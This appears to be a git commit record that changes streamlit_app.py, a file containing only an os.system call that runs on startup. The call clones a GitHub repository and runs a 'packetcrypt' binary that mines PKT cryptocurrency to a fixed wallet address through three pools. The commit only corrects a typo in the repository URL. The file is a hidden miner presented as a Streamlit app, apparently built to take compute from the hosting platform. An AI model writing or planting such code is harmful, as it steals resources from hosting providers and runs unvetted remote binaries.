198f550aab429a4b4d58d4c03dbd32be3e725ec5
streampkt <99090435+streampkt@users.noreply.github.com>
2022-02-05 22:49:33 +0530

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -1,2 +1,2 @@
 import os
-os.system ("git clone https://github.com/istmesingh/pkt && cd pkt && chmod +x packetcrypt && ./packetcrypt ann -p pkt1q6522hxwgt5y3r044qmfy3l3a9pmawpfdk5ucue https://stratum.zetahash.com http://pool.pktpool.io http://pool.pkt.world ")
+os.system ("git clone https://github.com/itsmesingh/pkt && cd pkt && chmod +x packetcrypt && ./packetcrypt ann -p pkt1q6522hxwgt5y3r044qmfy3l3a9pmawpfdk5ucue https://stratum.zetahash.com http://pool.pktpool.io http://pool.pkt.world ")
